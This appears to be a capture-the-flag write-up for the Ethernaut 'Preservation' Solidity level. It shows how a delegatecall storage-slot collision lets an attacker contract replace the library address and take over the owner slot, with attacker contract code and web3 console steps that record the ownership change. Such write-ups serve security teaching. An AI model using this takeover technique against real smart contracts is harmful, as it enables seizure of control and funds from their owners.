## Storage layout

Both internal adresses point to `LibraryContract` instances.
These are called using `delegatecall`, so they have access to the storage of the `Preservation` object.

The storage layout of the `Preservation` contract is:

```solidity
address public timeZone1Library; // slot 0
address public timeZone2Library; // 1
address public owner;  // 2
uint storedTime; // 3
```

Since no two variables can be combined into less than 32 bytes, they are each on a distinct slot.

While `storedTime` is in slot 3 in the originating contract, it is in slot 0 in the library.

## Overwriting the storage

So, the `setTime` in the library will overwrite the first slot, which is `timeZone1Library` in the original contract.

First, it can be set to the address of the malicious contract:

```solidity
function changeLibraryAddress(address target) public {
    Preservation(target).setFirstTime(uint(uint160(address(this))));
}
```

Now, the calls to `setFirstTime` will trigger `setTime` in our contract.

This function can be written to overwrite the owner, IE the third slot:

```solidity
function setTime(uint time) public {
    owner = tx.origin;
}
```

By mirroring the storage layout from the `Preservation` contract:

```solidity
address public _a;
address public _b;
address public owner;
```

Finally, the attack is triggered by another call to `setFirstTime`:

```solidity
function changeContractOwner(address target) public {
    Preservation(target).setFirstTime(block.timestamp);
}
```

## Attack

Setup:

```js
abi = '[{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"changeContractOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"changeLibraryAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"time","type":"uint256"}],"name":"setTime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"_a","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_b","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]';
graff = new web3.eth.Contract(JSON.parse(abi), '0x0b92590496b7CF89Fc6533E27A44Bd846053F04E');
```

Attack:

```js
// '0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'
await contract.timeZone1Library()
// step 1
graff.methods.changeLibraryAddress(contract.address).send({from: player}, function(e, d) {console.log(d);});
// '0x0b92590496b7CF89Fc6533E27A44Bd846053F04E'
await contract.timeZone1Library()
// '0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed'
await contract.owner()
//step 2
graff.methods.changeContractOwner(contract.address).send({from: player}, function(e, d) {console.log(d);});
// '0xAAD026992b0065D4A9c7019B082cb748D042411F'
await contract.owner()
```
